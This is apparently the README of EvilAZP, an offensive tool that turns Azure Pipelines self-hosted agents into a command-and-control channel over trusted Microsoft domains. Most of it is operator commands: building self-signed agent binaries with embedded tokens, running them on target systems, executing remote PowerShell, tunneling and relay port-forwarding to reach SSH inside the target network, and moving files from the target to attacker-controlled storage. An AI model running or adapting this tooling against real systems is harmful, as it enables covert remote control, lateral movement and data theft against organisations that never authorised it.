# EvilAZP
---
Microsoft Azure Pipelines is a CI/CD service that enables users to build and configure automated pipelines.
By using the self-hosted machine option, Azure Pipelines can designate multi-cloud or on-premises environments as pipeline clients.

Azure Pipelines also supports remote command execution. Because it maintains a persistent and reliable connection over a trusted channel, it can be abused by attackers as a command-and-control (C2) channel.
EvilAZP uses only trusted domains during server communication.


# How It Works
---
```
 [Operator Host]              [Azure DevOps]                 [Agent Host]
  evilazp CLI                  dev.azure.com                  Azure Pipelines Agent
       |                             |                                  |
       | 1. REST API                 |                                  |
       | /agents, /pipelines         |                                  |
       |---------------------------->|                                  |
       |                             |                                  |
       | 2. queue pipeline run       |                                  |
       | commandB64, targetAgent     |                                  |
       |---------------------------->|                                  |
       |                             | 3. agent polling                 |
       |                             |<---------------------------------|
       |                             |                                  |
       |                             | 4. job assigned                  |
       |                             |--------------------------------->|
       |                             |                                  |
       |                             |                                  | 5. run azure-pipelines.yml
       |                             |                                  | decode commandB64
       |                             |                                  | execute PowerShell
       |                             |                                  |
       |                             | 6. upload logs                   |
       |                             |<---------------------------------|
       |                             |                                  |
       | 7. poll build logs          |                                  |
       |<----------------------------|                                  |
       |                             |                                  |
       | 8. print command output     |                                  |
       v                             v                                  v
   local terminal              pipeline/log store                command executed
```

# Prerequisites
---
- `az` CLI installed and authenticated
- Create an Azure DevOps Organization
- Azure DevOps PAT with permission to create/read projects, repos, agent pools, build definitions, and queue builds
- Python 3.10+

# Setup
---
### 0. Create a PAT
Go to `https://dev.azure.com/yourname` and create a Personal Access Token (PAT) by navigating to `Account > Personal Access Tokens > New Token`.

For demo purposes, you may use **Full Access** for the PAT. However, in production environments, you should assign only the minimum required permissions, as the PAT may be exposed in the agent configuration files.


### 1. evilazp connect
Run EvilAZP and enter the organization name and PAT created in `/connect` mode.
```bash
source venv/bin/activate
evilazp
evilazp(no-agent)> /connect
```

### 2. Create a project
Create a project to configure the pipeline.
```bash
evilazp(no-agent)> /project create --project evilazp-project
evilazp(no-agent)> /project list
```

### 3. Create a pipelines
Create a pipeline to deliver commands.
```bash
evilazp(no-agent)> /pipeline create --project evilazp-project --repo evilazp-repo --pipeline evilazp-pipeline --pool evilazp-pool --branch main
evilazp(no-agent)> /pipeline list --project evilazp-demo
```

### 4. Create an agent-pools
```bash
evilazp(no-agent)> /agent-pool create --pool evilazp-pool
evilazp(no-agent)> /agent-pool list
```

### 5. compile
Refer to `.env.example` and add the following values to your `vendor/azure-pipelines-agent/.env` file.
```yaml
url: https://dev.azure.com/<org>
pat: <azure-devops-pat>
pool: <agent-pool>
agent: <agent-name>
```

```python
# Generate a Windows agent file using the values hardcoded in .env
evilazp(no-agent)> /agent create --yaml --runtime win-x64 --polling 1

# Generate and Authenticode self-sign a Windows agent file
evilazp(no-agent)> /agent create --yaml --runtime win-x64 --polling 1 --sign

# Generate a Linux agent file using the values hardcoded in .env
evilazp(no-agent)> /agent create --yaml --runtime linux-x64 --polling 1
```

# Usage
---
### 1. Agent Connection
Execute the agent file on the target system.
```bash
# Windows
.\Agent.Listener.exe

# Linux
./Agent.Listener
```

### 2. Verify the agent connection.
EvilAZP sends traffic to Azure Pipelines every 5 seconds in the background to retrieve the agent list.
After the agent is successfully registered, wait about 10 seconds and use the `agents` command to verify the registered agent.

```bash
evilazp(no-agent)> /agent list
```

### 3. Remote Command Execution
After the agent is connected, it can be managed from the agent list, and commands can be executed on the selected agent.
```bash
# Select an agent.
evilazp(no-agent)> /use 1

# Remote Command Execution
evilazp(agent)> /run whoami; hostname
```

# Tunneling
---
Tunneling is a technique that establishes a tunnel between a local port on the agent system and a local port on the system running EvilAzp.

This feature can be used as a plugin for the agent file and leverages Microsoft’s Dev Tunnels service.

To build the agent file, configure the Dev Tunnels options in the `.env` file.

To establish tunneling from the agent, the agent must authenticate with an Azure account.

For one-line CLI-based authentication, EvilAzp uses a service principal. Therefore, the agent must be built with the required Dev Tunnels authentication values included in the `.env` file: `tenant-id`, `sp-client`, and `sp-secret`.

```bash
# Local port tunneling example: local port 22 on the agent system
echo "tunnel_id: evilazp-tunnel \ntunnel_ports: 22" >> vendor/azure-pipelines-agent/.env

# Generate a Windows agent file using the values hardcoded in .env
evilazp(agent)> /agent create --yaml --runtime win-x64 --polling 1 --tunnel

# Generate a Linux agent file using the values hardcoded in .env
evilazp(agent)> /agent create --yaml --runtime linux-x64 --polling 1 --tunnel
```

Afterwards, execute the agent file on the target system.

```bash
# Windows
.\Agent.Listener.exe

# Linux
./Agent.Listener
```

Then, return to the attacker system and use the /devtunnels module in EvilAzp to establish tunneling with a local port.
```bash
# Establishing a tunnel with EvilAzp & check
evilazp(no-agent)> /devtunnels start --tunnel-id evilazp-tunnel --port 22 --local 2222
evilazp(no-agent)> /devtunnels list

# After the tunnel is established, access the target protocol through the attacker’s local forwarded port.
ssh target@127.0.0.1 -p 2222

# cleanup
evilazp(no-agent)> /devtunnels stop 2222
```


# Port Forwarding
---
Port forwarding is implemented through Azure Relay Bridge.

To use `relay-bridge`, a namespace, a Hybrid Connection, and a namespace key are required. All required components can be created from EvilAzp using the `/relay-bridge` module.

```bash
# Create a resource group & check
evilazp(no-agent)> /resource-group create -g rg-relay-bridge -l koreacentral
evilazp(no-agent)> /resource-group list

# Create a namespace & check
evilazp(no-agent)> /relay-bridge ns create -g rg-relay-bridge -n evilazp-bridge
evilazp(no-agent)> /relay-bridge ns list -g rg-relay-bridge

# Create a Hybrid Connection & check
evilazp(no-agent)> /relay-bridge hc create -g rg-relay-bridge -n evilazp-bridge relay-bridge
evilazp(no-agent)> /relay-bridge hc list -g rg-relay-bridge -n evilazp-bridge

# Retrieve the namespace key
evilazp(no-agent)> /relay-bridge ns keys -g rg-relay-bridge -n evilazp-bridge
```

```bash
# Hardcode the namespace key in the .env file to allow the agent file to connect properly
echo 'relay_connection_string: "<ns-key>"'

# Add the port forwarding information to the .env file(When the attacker accesses a local port on the target)
echo "relay_remote_forward:\n  relay-bridge:127.0.0.1:22" >> vendor/azure-pipelines-agent/.env

# Add the port forwarding information to the .env file(When the attacker accesses a local port on another host within the target network)
echo "relay_remote_forward:\n  relay-bridge:192.168.11.28:22"  >> vendor/azure-pipelines-agent/.env
```

```bash
# Build the agent file with relay-bridge enabled
/agent create --runtime win-x64 --polling 1 --relay --yaml
/agent create --runtime linux-x64 --polling 1 --relay --yaml
```

Afterwards, execute the agent file on the target system.

```bash
# Windows
.\Agent.Listener.exe

# Linux
./Agent.Listener
```

Now, start the relay bridge connection from the attacker system.
```bash
/relay-bridge start -x "<Endpoint=example>" -L 2222:relay-bridge
evilazp(no-agent)> /relay-bridge list
```

You can now connect to SSH from the attacker’s local port through local port forwarding.

```bash
ssh target@127.0.0.1 -p 2222

# cleanup
evilazp(no-agent)> /relay-bridge stop 2222
```

# File upload & download
---
File upload and download are handled through the Azure Files service.

To use this feature, you need a “Pay-as-you-go” Azure subscription, or an equivalent billable Azure subscription that allows you to create an Azure Storage account.

```bash
# Create a storage account
# Do not forget that special characters are not allowed.
# The creation process may take about 2 minutes.
evilazp(agent)> /azure-files storage-account create evilazpsa -g rg-azure-files -l koreacentral
evilazp(agent)> /azure-files storage-account list

# Retrieve the storage account key
evilazp(agent)> /azure-files storage-account key --account evilazpsa

# Generate and save a SAS token
evilazp(agent)> /azure-files sas

# Create a storage share
evilazp(agent)> /azure-files share create evilazp-share
evilazp(agent)> /azure-files share list

# Create a storage directory
# This is not required, but is useful for organizing files.
evilazp(agent)> /azure-files directory create uploads --share evilazp-share
evilazp(agent)> /azure-files list --share /evilazp-share

# Upload a file from the agent environment to storage
evilazp(agent)> /upload --target agent C:/Windows/System32/drivers/etc/hosts /evilazp-share/uploads/hosts
evilazp(agent)> /azure-files list --share /evilazp-share/uploads/

# Download a file from storage to the agent
evilazp(agent)> /download --target agent /evilazp-share/uploads/hosts C:/Windows/Temp/hosts

# Upload a file from the attacker host to storage
echo 'hello, evilazp' > /tmp/test.txt
evilazp(agent)> /upload --target local /tmp/test.txt /evilazp-share/uploads/test.txt
evilazp(agent)> /azure-files list --share /evilazp-share/uploads/

# Download a file from storage to the attacker host
evilazp(agent)> /download --target local /evilazp-share/uploads/test.txt /tmp/test.txt
```

# Cleanup
---
```bash
# remove agent-pool & check
evilazp(no-agent)> /agent-pool remove --pool evilazp-pool --yes
evilazp(no-agent)> /agent-pool list

# remove pipeline & check
evilazp(no-agent)> /pipeline remove evilazp-pipeline --project evilazp-demo --yes
evilazp(no-agent)> /pipeline list --project evilazp-demo

# remove project & check
evilazp(no-agent)> /project remove evilazp-demo --yes
evilazp(no-agent)> /project list

# remove storage account & check
evilazp(no-agent)> /azure-files storage-account remove --account evilazpsa -g rg-azure-files
evilazp(no-agent)> /azure-files storage-account list
```
